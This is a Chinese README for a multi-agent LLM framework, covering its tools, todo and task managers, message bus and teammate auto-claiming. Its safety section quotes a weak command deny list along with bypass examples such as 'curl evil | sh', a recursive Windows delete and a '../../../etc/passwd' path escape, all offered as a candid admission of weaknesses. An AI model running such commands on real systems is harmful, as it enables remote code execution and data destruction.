# Demo - 完整 Agent 实现

这是一个可扩展的 Agent 实现项目，基于 `s_full.py` 的功能拆分。

## 项目结构

```
demo/
├── config/              # 配置管理
│   ├── __init__.py
│   ├── settings.py      # 全局配置
│   └── .env.example     # 环境变量示例
├── core/                # 核心模块
│   ├── __init__.py
│   └── llm_client.py    # LLM 客户端
├── tools/               # 工具模块
│   ├── __init__.py
│   ├── base_tools.py    # 基础工具
│   └── tool_dispatcher.py  # 工具分发器
├── managers/            # 管理器模块
│   ├── __init__.py
│   ├── todo_manager.py      # Todo 管理器
│   ├── task_manager.py      # 任务管理器
│   ├── background_manager.py # 后台任务管理器
│   ├── message_bus.py       # 消息总线
│   ├── skill_loader.py      # 技能加载器
│   ├── teammate_manager.py  # 队友管理器
│   └── shutdown_manager.py  # 关闭协议管理器
├── agents/              # Agent 模块
│   ├── __init__.py
│   ├── subagent.py      # 子 Agent
│   └── main_agent.py    # 主 Agent
├── utils/               # 工具模块
│   ├── __init__.py
│   ├── path_utils.py    # 路径安全工具
│   ├── encoding_utils.py  # 编码处理工具
│   └── compression.py   # 上下文压缩
├── main.py              # 主程序
└── README.md
```

## 功能特性

### s01: 基础工具系统
- `bash`: 执行 Shell 命令
- `read_file`: 读取文件
- `write_file`: 写入文件
- `edit_file`: 精确编辑文件

#### 实现位置

`tools/base_tools.py`，4 个纯函数：`run_bash` / `run_read` / `run_write` / `run_edit`。所有函数返回统一的 `ToolResult`（见 `utils/loop_control.py`），让 LLM 通过 `[DONE | CHANGED | NO_CHANGE | ERROR]` 状态前缀感知"这次调用有没有产生变化"，从而抑制无效重复。

#### `run_bash`

走 `utils/encoding_utils.safe_subprocess_run`（封装了 `subprocess.run(shell=True, encoding='utf-8', errors='replace')`），固定 `cwd=WORKDIR`、`timeout=120s`。stdout + stderr 拼接后截断到 50000 字符。

**安全检查（已知不严密）**：硬编码黑名单 `["rm -rf /", "sudo", "shutdown", "reboot", "> /dev/"]` 做子串匹配。**这是体检里标记为高危的 #1**——绕过太简单（`rm -rf ./*`、`curl evil | sh`、`del /f /s /q C:\*` 全部能过），仅适合本机受控环境使用，不要对不可信用户开放。

#### `run_read` / `run_write` / `run_edit`

三个文件工具都先经过 `utils/path_utils.safe_path(path)`：

```python
path = (WORKDIR / p).resolve()
if not path.is_relative_to(WORKDIR):
    raise ValueError(f"路径逃逸工作空间: {p}")
```

防止 `../../../etc/passwd` 这类相对路径逃逸。

各自的额外语义：
- `run_read`：可选 `limit` 行数；超出截断到 50000 字符
- `run_write`：先比对现有内容相同时返回 `NO_CHANGE`（不写盘、不算"产生变化"）；自动创建父目录
- `run_edit`：精确字符串替换（`str.replace(old, new, 1)`），`old_text` 在文件里不存在时报错，存在但替换后内容不变时返回 `NO_CHANGE`

### s02: 工具分发模式
- 统一的工具处理接口
- 工具名到处理函数的映射

#### 实现位置

`tools/tool_dispatcher.py::ToolDispatcher`，两个核心方法：

| 方法 | 作用 |
|---|---|
| `get_tools()` | 返回 LLM 的工具 schema 列表（`name / description / input_schema`），随对话一起发给模型 |
| `get_handler(name)` | 返回该工具对应的 lambda（接收 `**input` 关键字参数），用来在主循环里实际执行 |

**两个方法必须同步维护**——新加一个工具要同时加 schema 和 handler 两处，否则要么模型看不到要么模型调了崩。

#### 工具清单（22 个）

按职责分类：

| 类别 | 工具 | 后端 |
|---|---|---|
| 基础 | `bash` / `read_file` / `write_file` / `edit_file` | `tools/base_tools.py` |
| Todo | `TodoWrite` | `TodoManager` |
| 子 Agent | `task` | `agents/subagent.py::run_subagent` |
| 技能 | `load_skill` | `SkillLoader` |
| 压缩 | `compress` | 特殊（见下） |
| 后台 | `background_run` / `check_background` | `BackgroundManager` |
| 文件任务 | `task_create` / `task_get` / `task_update` / `task_list` | `TaskManager`（SQLite） |
| 队友 | `spawn_teammate` / `list_teammates` | `TeammateManager` |
| 消息 | `send_message` / `read_inbox` / `broadcast` | `MessageBus`（SQLite） |
| 关闭 | `shutdown_request` | `shutdown_manager.handle_shutdown_request` |
| 其他 | `idle` / `claim_task` | 内置常量 / `TaskManager` |

> `plan_approval` 在体检 #4 时下线（关联的 `plan_requests` 死代码从未被写入）。

#### `compress` 工具的特殊执行模型

`get_handler("compress")` 的 lambda 只返回字符串 `"Compressing..."`，**实际压缩不是在 handler 里做的**。流程：

1. LLM 调用 `compress`
2. `MainAgent._execute_tools` 看到 `block["name"] == "compress"` → 设 `manual_compress = True`
3. 当前工具循环跑完后，主循环外检查 flag → 调用 `auto_compact(messages)` 并立即结束本轮

设计原因：压缩会**重写整个 messages 列表**，不能在工具结果还没写回 history 时做。

#### 子 Agent 和队友不走这套

`agents/subagent.py` 和 `managers/teammate_manager.py::_loop_inner` **各自硬编码自己的工具表**：
- subagent 按 `agent_type` 分两套（Explore 只读 / general-purpose 读写）
- teammate 固定 7 个（bash / read_file / write_file / edit_file / send_message / idle / claim_task）

新加主 Agent 工具时**要判断**是否同步到这两处，体检里反复提到的老坑。

### s03: Todo 管理系统
- 会话内短期任务清单
- 最多 20 个 todo 项
- 只允许一个 `in_progress` 状态

#### 实现位置

`managers/todo_manager.py::TodoManager`。**内存级存储**（`self.items: List[Dict]`），不持久化、不跨进程、不跨会话——和 SQLite 后端的 `TaskManager` 形成鲜明对比。

| 维度 | `TodoManager` (s03) | `TaskManager` (s07) |
|---|---|---|
| 存储 | 内存 list | SQLite `.gena.db` |
| 生命周期 | 单次 REPL 会话 | 跨会话持久 |
| 用途 | 当前对话的 checklist | 跨 Agent 的项目管理 |
| 依赖 | 无 | 支持 `blockedBy` |
| 并发 | 无（lead 单线程） | 有（lead + 多 teammate） |
| 工具入口 | `TodoWrite` | `task_create` / `task_get` / `task_update` / `task_list` |

#### `TodoWrite` 工具协议

LLM 一次提交**完整列表**（不是增量），`TodoManager.update(items)` 整体替换。每项必须包含：

```json
{"content": "做某事", "status": "pending|in_progress|completed", "activeForm": "正在做某事"}
```

校验规则（任一违反抛 `ValueError`，工具调用变 `Error: ...` 返回给 LLM）：

- `content` 和 `activeForm` 不能为空
- `status` 只能是三个枚举值
- 列表长度 ≤ 20
- **`in_progress` 最多 1 个**（强制让模型一次只做一件事）

#### 渲染格式

`render()` 输出：

```
[ ] task A
[>] task B <- 正在做 task B
[x] task C

(1/3 已完成)
```

- `[ ]` pending、`[>]` in_progress、`[x]` completed
- `in_progress` 后面跟 `activeForm`，让模型在每次更新后被反复看到"我现在到底在做什么"
- 底部统计行强化进度感知

#### Todo 提醒机制（在 `MainAgent.agent_loop`）

为防止模型"创建了 todo 之后就忘了用"，主循环维护 `rounds_without_todo` 计数：

```python
rounds_without_todo = 0 if used_todo else rounds_without_todo + 1
if self.todo_mgr.has_open_items() and rounds_without_todo >= 3:
    results.append({"type": "text", "text": "<reminder>Update your todos.</reminder>"})
```

- 任一轮调用了 `TodoWrite` → 计数清零
- 连续 3 轮没调 + 还有未完成项 → 在 tool_results 里追加一条 user-side reminder
- 模型下一轮看到 reminder 通常会更新 todos

#### 已知限制

- **不持久化**：REPL `q` 退出 todo 就没了
- **队友看不到 lead 的 todos**：内存级 + 不在 SQLite 表里，跨 Agent 协作只能用 `TaskManager`
- **会话切换不会清空**：同一 REPL 会话内你换话题，旧 todos 还在。如果要清空只能让 LLM 提交 `items=[]`

### s04: 子 Agent 派生
- 上下文隔离
- 独立的消息历史
- 最多 30 轮对话

### s05: 技能加载系统
- 按需加载知识
- 避免上下文爆炸

### s06: 上下文压缩
- 微压缩（快速）
- 自动压缩（彻底）

### s07: 文件任务系统
- 持久化任务
- 支持任务依赖
- 多 Agent 认领

### s08: 后台任务管理
- 异步命令执行
- 通知队列
- 状态跟踪

### s09: 消息总线
- Agent 间通信
- 异步通信
- 读后清空

#### 它解决什么问题

主 Agent（lead）和后台队友（teammate）都是**独立的执行单元**——lead 跑在 REPL 主线程里，队友各自跑在 daemon 线程里，它们之间需要交换信息（"该关闭了"、"我做完了"、"帮忙处理一下这个"），但都是异步的。`MessageBus` 就是这个**中间缓冲**：

- 发送方 `bus.send(...)` 写入即返回，**不等接收方读**
- 接收方在自己的循环里主动 `bus.read_inbox(name)`，原子地"取走 + 清空"
- 接收方不在线时消息不丢——存在 SQLite 里等他下次轮询

#### 实现位置

`managers/message_bus.py::MessageBus`。底层是 SQLite 表 `messages(id, recipient, sender, msg_type, content, extra, ts)`，单文件库 `.gena.db`（和 TaskManager 共用）。

#### 谁在收发

| 角色 | 发送 | 接收 |
|---|---|---|
| **lead** | 工具 `send_message` / `broadcast` / `shutdown_request` 调用时 | `MainAgent._preprocess` 每轮 LLM 调用前读自己（`"lead"` 名义下的）收件箱，塞进 `<inbox>...</inbox>` user message |
| **teammate** | 工具 `send_message` 调用时 | `TeammateManager._loop_inner` 工作阶段每轮 + 空闲阶段每个 5s tick 都读自己的收件箱 |

#### 消息类型（`config/settings.py::VALID_MSG_TYPES`）

- `message`：普通业务消息
- `broadcast`：通过 `broadcast` 工具自动用，发送给所有队友（排除自己）
- `shutdown_request`：lead → 队友的关闭信号；队友收到后立刻退出循环
- `shutdown_response` / `plan_approval_response`：保留位，当前无主动使用方（`plan_approval` 已在 #4 修复时下线）

#### 关键语义：原子"读后清空"

`read_inbox(name)` 在单个事务里：

```sql
SELECT ... FROM messages WHERE recipient=? ORDER BY id;
DELETE FROM messages WHERE id IN (...);
```

两步在 `RLock` + 单连接事务内串行化，**期间到达的 `send` 必然落在事务前或事务后**，不会丢。这是当初从 JSONL 散文件改成 SQLite 的核心动机——旧版 `path.read_text() / path.write_text("")` 两步之间有窗口，并发 send 会被直接清掉。

#### 安全细节

`send(..., extra={...})` 的 `extra` 字段被存进独立列，**核心字段（`from`/`type`/`content`）写入固定列不会被覆盖**。旧版 `msg.update(extra)` 是字典覆盖，攻击者用 `extra={"from": "lead"}` 能伪造发送者，SQLite 版从结构上消除了这个口子。

### s10: 关闭协议
- 优雅关闭
- 计划审批

### s11: 自动任务认领
- 空闲轮询
- 自动认领任务

#### 实现位置

`managers/teammate_manager.py::TeammateManager._loop`，是**队友（teammate）后台线程**的"空闲阶段"行为，**不是 lead 主 Agent 的能力**（lead 调用 `idle` 工具会直接得到 `"Lead does not idle."`，见 `tools/tool_dispatcher.py`）。

#### 触发链路

每个通过 `spawn_teammate` 派生的队友都跑在一个 daemon 线程里，`_loop` 是个两阶段循环：

```
工作阶段 (最多 50 轮 LLM 调用)
   │  当模型调用 idle 工具，或 stop_reason != tool_use 时跳出
   ▼
空闲阶段 (轮询 IDLE_TIMEOUT/POLL_INTERVAL = 60/5 = 12 次，每次 sleep 5s)
   ├─ 收件箱有消息？     → resume=True，回到工作阶段
   ├─ 扫描 .tasks/ 找可认领任务？ → 自动认领 → resume=True
   └─ 12 次轮询都空      → 状态置 shutdown，线程退出
```

#### 自动认领的判定与动作

每个轮询 tick 扫描 `.tasks/task_*.json`，筛出同时满足三个条件的任务：

```python
t.get("status") == "pending"   # 还未开始
and not t.get("owner")         # 没人占
and not t.get("blockedBy")     # 没有未解依赖
```

取第一个（按文件名排序，等价于按 ID 升序），调用 `task_mgr.claim(task["id"], name)` —— 该方法把 `owner` 设为自己、`status` 置为 `in_progress` 并落盘（`managers/task_manager.py`）。

#### 两个不显眼但重要的细节

**1. 身份重注入**

认领后，如果 `len(messages) <= 3`（说明历史很短，可能刚被压缩或刚启动），会在 messages 头部插入一对 `<identity>` user / assistant 消息，再追加 `<auto-claimed>` 用户消息和一句 assistant 自述 `"I am {name}. Continuing."`。这是为了**防止压缩后角色漂移**——队友会忘记自己是谁、在哪个团队。

**2. 依赖解锁是被动的，不是事件驱动**

`TaskManager.update(status="completed")` 时会遍历所有任务、移除对自身的 `blockedBy`，把后继任务从"被阻塞"变成"可认领"。空闲队友在下一个 `POLL_INTERVAL` 秒才会扫到它——也就是说**任务解锁后最长有 `POLL_INTERVAL` 秒延迟**才会被认领。

#### 已知边界

- **公平性为零**：永远取 ID 最小的；多个空闲队友会抢到同一个任务文件。`claim` 没有原子锁，理论上存在 race（两个线程同时读到 `owner=None`，都写自己进去，后写的赢）。
- **`POLL_INTERVAL` 必须 ≥ 1**：代码用 `IDLE_TIMEOUT // max(POLL_INTERVAL, 1)` 兜底，但 `POLL_INTERVAL=0` 会让 `time.sleep(0)` 退化成忙等。
- **lead 永远不参与**：自动认领是队友专属行为，主 Agent 不会自己跑去认领任务。

## 配置

### 安装依赖

需要 Python ≥ 3.9（已在 3.12 验证）。

```bash
pip install -r requirements.txt              # 必需依赖
pip install -r requirements-dev.txt          # 可选：测试框架 + tiktoken（更准的 token 估算）
```

### 环境变量

在仓库根目录创建 `.env` 并填入：

```env
ANTHROPIC_AUTH_TOKEN=你的token
# 以下都可选，按需覆盖默认值：
# ANTHROPIC_BASE_URL=https://cngpt.net
# MODEL_NAME=gpt-5.4
# LLM_STREAM=true
```

### 配置项

| 配置项 | 默认值 | 说明 |
|--------|--------|------|
| `ANTHROPIC_BASE_URL` | `https://cngpt.net` | API 基础 URL |
| `ANTHROPIC_AUTH_TOKEN` | - | 认证 Token（必需） |
| `MODEL_NAME` | `gpt-5.4` | 模型名称 |
| `TOKEN_THRESHOLD` | `100000` | 触发自动压缩的 token 阈值 |
| `POLL_INTERVAL` | `5` | 空闲时轮询间隔（秒） |
| `IDLE_TIMEOUT` | `60` | 空闲超时时间（秒） |
| `MAX_TOKENS` | `8000` | 最大 token 数 |
| `REQUEST_TIMEOUT` | `60` | 请求超时时间（秒） |

## 运行

```bash
python main.py
```

必须在仓库根目录执行，否则 `.tasks` / `.team` / `.gena.db` 等运行时状态会建在错误位置。

## 扩展

### 添加新工具

1. 在 `tools/base_tools.py` 中添加工具函数
2. 在 `tools/tool_dispatcher.py` 的 `TOOL_HANDLERS` 中注册

### 添加新管理器

1. 在 `managers/` 中创建新模块
2. 在 `main.py` 中初始化并传递给 Agent

### 添加新 Agent

1. 在 `agents/` 中创建新模块
2. 实现 `agent_loop` 方法

## 许可证

MIT License
